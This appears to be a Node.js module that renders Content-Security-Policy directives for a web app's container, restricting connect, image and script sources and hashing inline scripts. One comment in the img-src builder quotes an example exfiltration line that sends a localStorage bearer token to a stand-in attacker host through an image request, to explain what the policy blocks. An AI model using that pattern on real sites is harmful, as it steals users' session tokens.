// Builds the `connect-src` and `script-src` lists for the CSP the `web`
// container serves.
//
// The app's own origin is not enough: the browser talks to the API and (for the
// manifest link) the addon service, both of which live on separate origins that
// are only known at container start — which is why the header is rendered from
// a template by `render-serve-json.mjs` rather than shipped as a literal. The
// alternative the app used to send, `connect-src 'self' http: https: ws: wss:`,
// allows fetch/WebSocket to *any* host, which defeats the exfiltration
// protection the README's Security section credits the CSP with providing for
// the localStorage-token tradeoff.

import { createHash } from "node:crypto";
import { IMAGE_CDN_ORIGINS } from "../src/image-cdn-hosts.mjs";

// Mirrors the fallbacks in `src/api.ts`, so an install that never set
// VITE_API_BASE/VITE_ADDON_BASE keeps working.
const DEFAULT_API_BASE = "http://localhost:7000";
const DEFAULT_ADDON_BASE = "http://localhost:7001";

const CONNECT_SRC_PLACEHOLDER = "__CONNECT_SRC__";
const SCRIPT_SRC_PLACEHOLDER = "__SCRIPT_SRC__";
const IMG_SRC_PLACEHOLDER = "__IMG_SRC__";

const originOf = (value) => {
  if (typeof value !== "string" || !value.trim()) return null;
  try {
    const { origin } = new URL(value.trim());
    // Opaque origins (e.g. a `data:` URL) serialize to the string "null",
    // which as a CSP source would mean something else entirely.
    return origin && origin !== "null" ? origin : null;
  } catch {
    return null;
  }
};

/**
 * @param {{ apiBase?: string, addonBase?: string, sentryDsn?: string, extra?: string }} env
 * @returns {string} the `connect-src` value, always including `'self'`
 */
export const buildConnectSrc = ({ apiBase, addonBase, sentryDsn, extra } = {}) => {
  const sources = ["'self'"];
  const add = (source) => {
    if (source && !sources.includes(source)) sources.push(source);
  };

  add(originOf(apiBase) ?? originOf(DEFAULT_API_BASE));
  add(originOf(addonBase) ?? originOf(DEFAULT_ADDON_BASE));
  // Sentry is opt-in and reports to its own ingest host.
  add(originOf(sentryDsn));
  // Artwork CDNs. Not because the app connects to them — it puts them in <img>
  // tags, which `img-src` covers — but because the service worker caches them,
  // and a request a service worker answers is re-issued as a fetch from the
  // worker. See src/image-cdn-hosts.mjs.
  for (const origin of IMAGE_CDN_ORIGINS) add(origin);

  // Escape hatch for anything else this deployment's browser must reach —
  // most obviously an API base set per-browser via Settings → "API base URL",
  // which the container cannot know about.
  // Every entry has to parse as an absolute origin. That rejects the two things
  // worth rejecting: a whole scheme (`https:`) or a bare `*`, either of which
  // would re-open the any-host hole this whole file exists to close, and any
  // value carrying whitespace or a `;` that would split the directive. A
  // wildcard host (`https://*.example.com`) still parses, so it still works.
  for (const entry of (extra ?? "").split(",")) {
    const trimmed = entry.trim();
    if (!trimmed) continue;
    const origin = originOf(trimmed);
    if (!origin) {
      throw new Error(
        `CSP_CONNECT_SRC_EXTRA contains an invalid origin: "${trimmed}". Use absolute origins, e.g. "https://api.example.com,https://sentry.example.com" — a bare scheme or "*" would allow connections to every host.`
      );
    }
    add(origin);
  }

  return sources.join(" ");
};

/**
 * Builds `img-src`.
 *
 * The value this replaced was `'self' data: https:`, which is a wildcard over
 * every host on the web — and an <img> is a request, so it exfiltrates just as
 * well as a fetch does:
 *
 *     new Image().src = "https://attacker.example/?t=" + localStorage.cataloggy_token;
 *
 * The bearer token lives in localStorage by design, and `connect-src` was
 * tightened precisely so injected script could not post it anywhere. Leaving
 * `img-src` open left that door on the latch.
 *
 * Every picture the app renders — posters, backdrops, provider logos, cast
 * photos, game covers — comes from one of the four artwork CDNs, so naming them
 * costs nothing. `data:` stays for the inline placeholders; `'self'` for the
 * icons and the logo shipped with the build.
 *
 * @returns {string} the `img-src` value
 */
export const buildImgSrc = () => ["'self'", "data:", ...IMAGE_CDN_ORIGINS].join(" ");

// Comment or inline script, whichever comes first, in one left-to-right pass.
//
// The alternation is what keeps the two apart. index.html explains in prose why
// its script is inline rather than a `<script src>`, and scanning for tags
// alone reads that sentence as markup — swallowing the real script into a match
// that starts mid-comment. Matching comments in the same pass consumes them as
// tokens instead, so nothing inside one can be mistaken for a tag. Stripping
// them out first would do the same job, but a single removal pass over nested
// or malformed delimiters is exactly the kind of half-sanitising this doesn't
// need to be doing: there is nothing to sanitise here, only to read past.
//
// An inline script is one with no `src` attribute at all — a valueless `src`
// still stops the body from running, hence `\ssrc\b` rather than `\ssrc=`.
// `[^>]*` can't cross a `>`, so the lookahead stays inside the opening tag.
// A comment match leaves the capture group undefined; only scripts fill it.
const COMMENT_OR_INLINE_SCRIPT_RE =
  /<!--[\s\S]*?-->|<script(?![^>]*\ssrc\b)[^>]*>([\s\S]*?)<\/script>/gi;

/**
 * Builds `script-src` for a built index.html.
 *
 * The page carries one inline script — the dashboard's request head start —
 * which `script-src 'self'` alone blocks outright. `'unsafe-inline'` would buy
 * that back at the price of the directive's whole point, so each inline script
 * is allowed by the hash of its exact contents instead: change a byte of it and
 * the hash stops matching, which is the property we want.
 *
 * The hash is taken from the *built* HTML rather than the source, because the
 * built page is the one being served: the build is free to rewrite an inline
 * script or inject one of its own (a plugin's registration snippet, say), and
 * a hash of the input would then name a script nobody runs. It currently
 * passes this one through byte-for-byte, which is luck, not a guarantee — and
 * the reason this runs at container start instead of being pasted into the
 * template by hand.
 *
 * @param {string} html contents of dist/index.html
 * @returns {string} the `script-src` value, always including `'self'`
 */
export const buildScriptSrc = (html) => {
  const sources = ["'self'"];
  for (const [, body] of (html ?? "").matchAll(COMMENT_OR_INLINE_SCRIPT_RE)) {
    // Undefined for a comment; empty for an empty script, which needs no hash
    // and, per spec, would not match one anyway.
    if (!body) continue;
    const hash = createHash("sha256").update(body, "utf8").digest("base64");
    const source = `'sha256-${hash}'`;
    if (!sources.includes(source)) sources.push(source);
  }
  return sources.join(" ");
};

/**
 * Substitutes the rendered directives into the serve.json template.
 *
 * `img-src` takes no argument because nothing about it varies per container —
 * it is rendered here rather than written into the template so that it can be
 * built from the one list of artwork CDNs instead of a second copy that drifts.
 *
 * @param {string} template raw contents of serve.template.json
 * @param {string} connectSrc value returned by `buildConnectSrc`
 * @param {string} [scriptSrc] value returned by `buildScriptSrc`
 * @returns {string} serve.json contents
 */
export const renderServeConfig = (template, connectSrc, scriptSrc = "'self'") => {
  for (const placeholder of [
    CONNECT_SRC_PLACEHOLDER,
    SCRIPT_SRC_PLACEHOLDER,
    IMG_SRC_PLACEHOLDER,
  ]) {
    if (!template.includes(placeholder)) {
      throw new Error(`serve.json template is missing the ${placeholder} placeholder`);
    }
  }
  const rendered = template
    .replaceAll(CONNECT_SRC_PLACEHOLDER, connectSrc)
    .replaceAll(SCRIPT_SRC_PLACEHOLDER, scriptSrc)
    .replaceAll(IMG_SRC_PLACEHOLDER, buildImgSrc());
  // Fail here rather than serving a file `serve` would refuse to parse.
  JSON.parse(rendered);
  return rendered;
};
